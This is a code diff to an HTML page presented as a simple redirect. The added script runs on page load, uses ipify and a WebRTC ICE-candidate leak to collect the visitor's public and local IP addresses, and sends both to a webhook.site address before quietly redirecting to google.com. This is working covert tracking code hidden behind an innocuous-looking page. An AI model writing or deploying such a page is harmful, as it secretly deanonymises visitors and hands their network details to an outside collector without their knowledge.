@@ -4,8 +4,41 @@
     <meta charset="UTF-8">
     <title>Redirect</title>
     <script>
-      fetch("	https://webhook.site/4e30700d-6a69-49e3-93ac-8120a8b15388")
-        .finally(() => { window.location.replace("https://google.com"); });
+      async function main() {
+        let publicIP = 'unknown';
+        let localIP = 'unknown';
+
+        // Get public IP
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          const data = await res.json();
+          publicIP = data.ip;
+        } catch(e) {}
+
+        // Get local IP via WebRTC
+        try {
+          const pc = new RTCPeerConnection({iceServers: []});
+          pc.createDataChannel("");
+          pc.onicecandidate = (event) => {
+            if (event.candidate) {
+              const ipMatch = event.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
+              if (ipMatch) {
+                localIP = ipMatch[1];
+                // Send webhook and redirect once we have the local IP
+                fetch(`https://webhook.site/4e30700d-6a69-49e3-93ac-8120a8b15388/${publicIP}/${localIP}`)
+                  .finally(() => window.location.replace("https://google.com"));
+              }
+            }
+          };
+          const offer = await pc.createOffer();
+          await pc.setLocalDescription(offer);
+        } catch(e) {
+          // If WebRTC fails, still send public IP only
+          fetch(`https://webhook.site/4e30700d-6a69-49e3-93ac-8120a8b15388/${publicIP}/unknown`)
+            .finally(() => window.location.replace("https://google.com"));
+        }
+      }
+      main();
     </script>
   </head>
   <body></body>
